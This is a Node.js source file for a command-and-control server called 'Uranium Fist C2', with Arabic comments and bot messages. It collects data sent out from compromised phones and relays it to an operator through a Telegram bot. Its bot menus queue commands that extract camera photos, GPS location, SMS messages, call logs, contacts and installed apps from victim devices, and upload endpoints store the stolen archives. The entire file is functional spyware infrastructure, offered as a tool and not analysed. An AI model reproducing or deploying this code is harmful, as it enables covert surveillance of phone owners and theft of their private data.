// server_uranium_core.js
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const token = process.env.TG_TOKEN;
const chatId = process.env.TG_ID;

if (!token || !chatId) {
    console.error('[-] Critical Error: Telegram credentials missing.');
    process.exit(1);
}

const UPLOAD_DIR = path.join(__dirname, 'uranium_storage');
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_core.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
});

const app = express();
const appBot = new telegramBot(token, { polling: true });

appBot.on('polling_error', (error) => {
    if (error.code !== 'ETELEGRAM' || error.message.indexOf('409 Conflict') === -1) {
        console.log(`[Telegram Polling Warning]: ${error.code} - ${error.message}`);
    }
});

app.use(express.text({ type: 'application/json', limit: '50mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '500mb' }));

async function sendTg(msg, options = {}) {
    try {
        return await appBot.sendMessage(chatId, msg, { parse_mode: 'HTML', ...options });
    } catch (e) {
        console.error('TG Error:', e.message);
    }
}

app.get('/', (req, res) => {
    res.status(200).send(`<html><body style="background:#111;color:#ff5500;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE ONLINE [☢️]</h1></body></html>`);
});

// نقطة استقبال الرفع الثنائي الخام (Raw Binary / ZIP)
app.post('/api/v3/uranium/upload_raw', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';
        const fileName = req.headers['x-file-name'] || `uranium_archive_${Date.now()}.zip`;

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);

        if (!req.body || !Buffer.isBuffer(req.body)) {
            return res.status(400).json({ status: 'BAD_BINARY_PAYLOAD' });
        }

        const safeName = path.basename(fileName);
        const finalPath = path.join(UPLOAD_DIR, `${nodeId}_${Date.now()}_${safeName}`);
        fs.writeFileSync(finalPath, req.body);

        const stats = fs.statSync(finalPath);
        const fileSizeMB = stats.size / (1024 * 1024);

        if (fileSizeMB > 50) {
            await sendTg(`⚠️ <b>الملف كبير جداً (${fileSizeMB.toFixed(2)} MB):</b> يتجاوز حد تيليجرام (50MB)، تم حفظه بأمان في خزنة اليورانيوم.`);
        } else {
            await appBot.sendDocument(chatId, finalPath, { 
                caption: `☢️ <b>قبضة اليورانيوم - أرشيف الحصاد:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
            });
        }

        res.status(200).json({ status: 'OK', message: 'URANIUM_UPLOAD_SUCCESS' });
    } catch (e) {
        console.error('Uranium Upload Error:', e);
        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
    }
});

app.post('/api/v3/uranium/stream', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
        
        let payload;
        try {
            payload = JSON.parse(req.body);
        } catch (err) {
            return res.status(400).json({ status: 'BAD_PAYLOAD', error: err.message });
        }

        let directive = { status: 'ACK', task: null };

        if (payload.type === 'TEXT_REPORT') {
            const textData = payload.data || '';
            if (textData.includes('خطأ') || textData.includes('Error') || textData.includes('فشل') || textData.includes('بنجاح') || textData.includes('LOCATION') || textData.includes('APPS') || textData.includes('SHELL')) {
                await sendTg(`☢️ <b>تقرير قبضة اليورانيوم [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3500)}</pre>`);
            }
        }

        db.get(`SELECT * FROM tasks WHERE node_id = ? AND status = 'PENDING' LIMIT 1`, [nodeId], (err, row) => {
            if (row) {
                directive.task = { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') };
                db.run(`UPDATE tasks SET status = 'SENT' WHERE id = ?`, [row.id]);
            }
            res.status(200).json(directive);
        });
    } catch (e) {
        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
    }
});

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(chatId)) return;
    const text = msg.text;

    if (text === '/start') {
        db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
            if (!rows || rows.length === 0) {
                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم متصلة حالياً.</b>`);
                return;
            }

            let inlineKeyboard = [];
            rows.forEach(node => {
                inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
            });

            await sendTg(`☢️ <b>غرفة قيادة قبضة اليورانيوم المطلقة:</b>\nاختر العقدة المستهدفة للدمار الشامل:`, {
                reply_markup: { inline_keyboard: inlineKeyboard }
            });
        });
    }
});

appBot.on('callback_query', async (query) => {
    const data = query.data;
    const msg = query.message;

    if (data.startsWith('menu_')) {
        const nodeId = data.replace('menu_', '');
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '☢️ حصاد الكاميرا الشامل (ZIP)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
                    { text: '📍 تحديد الموقع الجغرافي (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }
                ],
                [
                    { text: '📨 الرسائل', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
                    { text: '📞 سجل المكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
                ],
                [
                    { text: '📇 جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
                    { text: '📱 التطبيقات المثبتة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
                ],
                [
                    { text: '📸 أحدث صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
                ],
                [{ text: '🔙 عودة للقائمة الرئيسية', callback_data: 'back_home' }]
            ]
        };
        await appBot.editMessageText(`🎯 <b>العقدة التحت سيطرة قبضة اليورانيوم:</b> <code>${nodeId}</code>`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    } else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');

        db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
            await appBot.answerCallbackQuery(query.id, { text: `☢️️ تم إطلاق أمر قبضة اليورانيوم [${action}] بنجاح!` });
            await sendTg(`🔥 <b>أمر قبضة اليورانيوم [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
        });
    } else if (data === 'back_home') {
        await appBot.deleteMessage(msg.chat.id, msg.message_id);
        await sendTg(`أرسل <code>/start</code> لإظهار قائمة عقد اليورانيوم النشطة.`);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Uranium Fist C2 Core Online on port ${PORT}`));
